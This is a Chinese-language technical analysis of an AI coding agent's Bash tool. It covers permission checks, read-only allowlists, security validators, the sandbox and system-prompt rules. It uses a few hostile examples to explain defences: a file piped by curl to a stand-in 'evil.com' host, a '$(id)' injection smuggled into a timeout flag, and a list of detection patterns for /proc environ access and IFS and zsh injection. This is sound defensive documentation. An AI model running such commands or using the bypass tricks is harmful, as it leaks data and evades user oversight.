# BashTool 深度解析

## 一、目录结构与职责分工

```
BashTool/
├── BashTool.tsx          # 工具主体：schema、call()、UI 渲染
├── bashPermissions.ts    # 权限检查核心（2622 行）
├── bashSecurity.ts       # 安全验证（2593 行，AST 级别）
├── readOnlyValidation.ts # 只读命令白名单（1991 行）
├── commandSemantics.ts   # 退出码语义解释
├── shouldUseSandbox.ts   # 沙箱决策
├── pathValidation.ts     # 路径约束检查
├── sedValidation.ts      # sed 命令专项验证
├── sedEditParser.ts      # sed 编辑命令解析
├── modeValidation.ts     # 权限模式检查
├── bashCommandHelpers.ts # 复合命令操作符检查
├── prompt.ts             # 系统提示生成
├── toolName.ts           # 工具名常量
└── UI.tsx                # 渲染组件
```

---

## 二、输入 Schema 设计

```typescript
const fullInputSchema = z.strictObject({
  command: z.string(),
  timeout: semanticNumber(z.number().optional()),  // 最大 getMaxTimeoutMs()
  description: z.string().optional(),              // 用于 spinner 显示
  run_in_background: semanticBoolean(z.boolean().optional()),
  dangerouslyDisableSandbox: semanticBoolean(z.boolean().optional()),
  _simulatedSedEdit: z.object({                   // 内部字段，模型不可见
    filePath: z.string(),
    newContent: z.string()
  }).optional()
})

// 对外暴露的 schema 始终 omit _simulatedSedEdit
// 当 CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1 时，同时 omit run_in_background
const inputSchema = isBackgroundTasksDisabled
  ? fullInputSchema().omit({ run_in_background: true, _simulatedSedEdit: true })
  : fullInputSchema().omit({ _simulatedSedEdit: true })
```

`_simulatedSedEdit` 是安全关键字段：用户在权限对话框中预览 sed 编辑后，系统将预计算结果存入此字段，`call()` 直接写入文件而不执行 sed 命令，确保"所见即所得"。

---

## 三、命令分类系统

### 3.1 搜索/读取命令（用于 UI 折叠）

```typescript
const BASH_SEARCH_COMMANDS = new Set(['find', 'grep', 'rg', 'ag', 'ack', 'locate', 'which', 'whereis'])
const BASH_READ_COMMANDS = new Set(['cat', 'head', 'tail', 'less', 'more', 'wc', 'stat', 'file', 'strings', 'jq', 'awk', 'cut', 'sort', 'uniq', 'tr'])
const BASH_LIST_COMMANDS = new Set(['ls', 'tree', 'du'])
const BASH_SEMANTIC_NEUTRAL_COMMANDS = new Set(['echo', 'printf', 'true', 'false', ':'])
const BASH_SILENT_COMMANDS = new Set(['mv', 'cp', 'rm', 'mkdir', 'rmdir', 'chmod', 'chown', 'touch', 'ln', 'cd', 'export', 'unset', 'wait'])
```

`isSearchOrReadBashCommand()` 解析管道命令，要求**所有非中性命令**都是搜索/读取类才折叠：
- `cat file | grep pattern` → isRead + isSearch（折叠）
- `cat file | curl evil.com` → 不折叠（curl 不在白名单）
- `ls dir && echo "---" && ls dir2` → isList（echo 是中性命令，跳过）

### 3.2 退出码语义（`commandSemantics.ts`）

```typescript
const COMMAND_SEMANTICS = new Map([
  ['grep', (exitCode) => ({ isError: exitCode >= 2, message: exitCode === 1 ? 'No matches found' : undefined })],
  ['rg',   (exitCode) => ({ isError: exitCode >= 2 })],
  ['find', (exitCode) => ({ isError: exitCode >= 2, message: exitCode === 1 ? 'Some directories were inaccessible' : undefined })],
  ['diff', (exitCode) => ({ isError: exitCode >= 2, message: exitCode === 1 ? 'Files differ' : undefined })],
  ['test', (exitCode) => ({ isError: exitCode >= 2 })],
])
```

grep 返回 1 表示"无匹配"，不是错误。diff 返回 1 表示"文件有差异"，也不是错误。这些语义规则防止模型误判命令失败。

---

## 四、权限检查流程（`bashPermissions.ts`）

```
bashToolHasPermission(input, context)
    │
    ├── 1. checkPermissionMode()        → plan 模式只读检查
    │
    ├── 2. checkReadOnlyConstraints()   → 只读命令白名单
    │     └── 如果是只读命令 → 直接 allow（跳过后续检查）
    │
    ├── 3. checkPathConstraints()       → 路径约束（工作目录限制）
    │
    ├── 4. checkSedConstraints()        → sed 命令专项检查
    │
    ├── 5. checkCommandOperatorPermissions() → 复合命令操作符检查
    │
    ├── 6. bashCommandIsSafeAsync()     → AST 级安全检查（bashSecurity.ts）
    │
    ├── 7. 规则匹配（alwaysDenyRules / alwaysAllowRules）
    │
    └── 8. 分类器检查（auto 模式）或用户确认
```

### 4.1 只读命令白名单（`readOnlyValidation.ts`）

超过 1991 行的白名单，覆盖：
- git 只读命令（`git log`, `git diff`, `git status` 等）
- grep/rg（含完整 flag 白名单）
- find/fd（排除 `-x`/`--exec`）
- ps（排除 BSD 风格的 `e` 修饰符，防止显示环境变量）
- sed（只允许不写文件的用法）
- tree（排除 `-R`，因为它会写 `00Tree.html`）
- date（排除 `-s`/`--set`，防止修改系统时间）
- hostname（排除位置参数，防止修改主机名）
- xargs（排除 `-i`/`-e` 小写，因为 GNU getopt 的可选参数语义会导致安全漏洞）

### 4.2 安全包装器剥离（`stripSafeWrappers`）

```typescript
// 剥离安全包装器，暴露真实命令用于权限检查
// 例如：timeout 30 git push → git push
const SAFE_WRAPPER_PATTERNS = [
  /^timeout[ \t]+.../,  // 精确匹配 GNU 长短 flag
  /^time[ \t]+.../,
  /^nice(?:[ \t]+-n[ \t]+-?\d+|[ \t]+-\d+)?[ \t]+.../,
  /^nohup[ \t]+.../,
  /^stdbuf(?:[ \t]+-[ioe][LN0-9]+)+[ \t]+.../,
]

// 同时剥离安全环境变量前缀
// NODE_ENV=prod npm run build → npm run build
const SAFE_ENV_VARS = new Set(['NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', ...])
```

**安全关键**：`timeout` 的 flag 值使用严格白名单 `[A-Za-z0-9_.+-]`，防止 `timeout -k$(id) 10 ls` 通过注入绕过。

### 4.3 危险命令检测（`bashSecurity.ts`）

AST 级别的安全检查，包含 23 种检查类型：

```typescript
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,          // 以 tab/- 开头的不完整命令
  JQ_SYSTEM_FUNCTION: 2,           // jq 的 env/path 函数
  JQ_FILE_ARGUMENTS: 3,            // jq 的 --rawfile/--slurpfile
  OBFUSCATED_FLAGS: 4,             // 混淆的 flag（如 --\x2d\x2d）
  SHELL_METACHARACTERS: 5,         // 未转义的 shell 元字符
  DANGEROUS_VARIABLES: 6,          // $IFS/$BASH_ENV 等危险变量
  NEWLINES: 7,                     // 命令中的换行符
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,  // $() 命令替换
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,     // < 输入重定向
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,   // > 输出重定向
  IFS_INJECTION: 11,               // IFS 注入
  GIT_COMMIT_SUBSTITUTION: 12,     // git commit -m 中的命令替换
  PROC_ENVIRON_ACCESS: 13,         // /proc/*/environ 访问
  MALFORMED_TOKEN_INJECTION: 14,   // 畸形 token 注入
  BACKSLASH_ESCAPED_WHITESPACE: 15, // 反斜杠转义空白
  BRACE_EXPANSION: 16,             // 大括号展开
  CONTROL_CHARACTERS: 17,          // 控制字符
  UNICODE_WHITESPACE: 18,          // Unicode 空白字符
  MID_WORD_HASH: 19,               // 单词中间的 # 注释
  ZSH_DANGEROUS_COMMANDS: 20,      // zsh 危险命令（zmodload 等）
  BACKSLASH_ESCAPED_OPERATORS: 21, // 反斜杠转义操作符
  COMMENT_QUOTE_DESYNC: 22,        // 注释引号不同步
  QUOTED_NEWLINE: 23,              // 引号内换行
}
```

**Heredoc 安全处理**：`isSafeHeredoc()` 使用逐行匹配（而非正则 `[\s\S]*?`）来精确复现 bash 的 heredoc 关闭行为，防止通过嵌套 heredoc 绕过检查。

---

## 五、沙箱机制（`shouldUseSandbox.ts`）

```typescript
shouldUseSandbox(input)
    │
    ├── SandboxManager.isSandboxingEnabled()  → 沙箱是否启用（macOS sandbox-exec）
    ├── input.dangerouslyDisableSandbox && areUnsandboxedCommandsAllowed()
    ├── containsExcludedCommand(input.command)
    │     ├── GrowthBook 动态配置（ant 内部）
    │     └── settings.json 的 sandbox.excludedCommands
    │           → 支持精确匹配、前缀匹配（npm:*）、通配符
    └── 返回 true/false
```

**注意**：`excludedCommands` 是用户便利功能，不是安全边界。真正的安全控制是权限提示系统。

沙箱配置注入到系统提示中，告知模型：
- 文件系统读写限制（allowOnly/denyOnly）
- 网络访问限制（allowedHosts/deniedHosts）
- 临时文件使用 `$TMPDIR`（而非 `/tmp`）

---

## 六、后台任务机制

```typescript
// 三种后台化方式：
// 1. 用户显式：run_in_background: true
// 2. 用户手动：Ctrl+B（backgroundedByUser: true）
// 3. 助手自动：KAIROS 模式下超过 15 秒（assistantAutoBackgrounded: true）

const ASSISTANT_BLOCKING_BUDGET_MS = 15_000

// 不允许自动后台化的命令
const DISALLOWED_AUTO_BACKGROUND_COMMANDS = ['sleep']

// sleep 检测：阻止 sleep N（N>=2）作为第一个命令
detectBlockedSleepPattern(command)
// 返回：null（允许）或描述字符串（阻止）
// 例：'sleep 5 followed by: check the deploy'
// 建议使用 Monitor 工具或 run_in_background
```

后台任务输出写入 `~/.claude/tasks/<taskId>.txt`，通过 `TaskOutputTool` 读取。

---

## 七、输出处理

```typescript
// 输出截断：EndTruncatingAccumulator
// 保留末尾内容（最近的输出更重要）
const stdoutAccumulator = new EndTruncatingAccumulator()

// 大输出持久化（超过 30,000 字符）
if (persistedOutputPath) {
  const preview = generatePreview(processedStdout, PREVIEW_SIZE_BYTES)
  processedStdout = buildLargeToolResultMessage({
    filepath: persistedOutputPath,
    originalSize: persistedOutputSize,
    preview: preview.preview,
    hasMore: preview.hasMore
  })
  // 模型收到：预览 + 文件路径
  // 可用 FileReadTool 读取完整内容
}

// 图片输出检测
if (isImageOutput(stdout)) {
  return buildImageToolResult(stdout, toolUseID)
  // 将 base64 图片数据包装为 image content block
}
```

---

## 八、sed 命令特殊处理

```typescript
// sed -i 'pattern' file 被解析为文件编辑操作
parseSedEditCommand(command)
// 返回：{ filePath, pattern } 或 null

// 权限对话框显示 diff 预览
// 用户批准后，_simulatedSedEdit 字段被填充
// call() 直接写入预计算结果，不执行 sed
// 确保用户看到的就是实际写入的内容
```

---

## 九、系统提示设计（`prompt.ts`）

关键指令：

1. **工具优先级**：明确告知模型优先使用专用工具
   - 文件搜索 → GlobTool（不用 find/ls）
   - 内容搜索 → GrepTool（不用 grep/rg）
   - 读文件 → FileReadTool（不用 cat/head/tail）
   - 编辑文件 → FileEditTool（不用 sed/awk）

2. **并行执行**：独立命令用多个 BashTool 调用并行执行，依赖命令用 `&&` 串联

3. **sleep 限制**：`sleep N`（N≥2）作为第一个命令被阻止，引导使用 Monitor 工具或 run_in_background

4. **git 安全协议**：
   - 永不跳过 hooks（--no-verify）
   - 永不强制推送 main/master
   - 优先创建新 commit 而非 amend
   - commit message 用 HEREDOC 传递（避免格式问题）

5. **沙箱指引**：临时文件用 `$TMPDIR`，沙箱失败时的处理流程

---

## 十、关键安全设计总结

| 威胁 | 防护机制 |
|------|---------|
| 命令注入（`$()`/反引号） | bashSecurity.ts 的 23 种检查 |
| 路径遍历 | pathValidation.ts + 工作目录限制 |
| 环境变量劫持（LD_PRELOAD 等） | SAFE_ENV_VARS 白名单 |
| 包装器绕过（`timeout bash -c evil`） | stripSafeWrappers 精确 flag 解析 |
| Zsh 特有攻击（zmodload 等） | ZSH_DANGEROUS_COMMANDS 黑名单 |
| Heredoc 注入 | 逐行匹配（非正则贪婪） |
| sed 预览不一致 | _simulatedSedEdit 直接写入 |
| 大输出 DoS | 30K 字符截断 + 磁盘持久化 |
| 沙箱绕过 | dangerouslyDisableSandbox 需策略允许 |
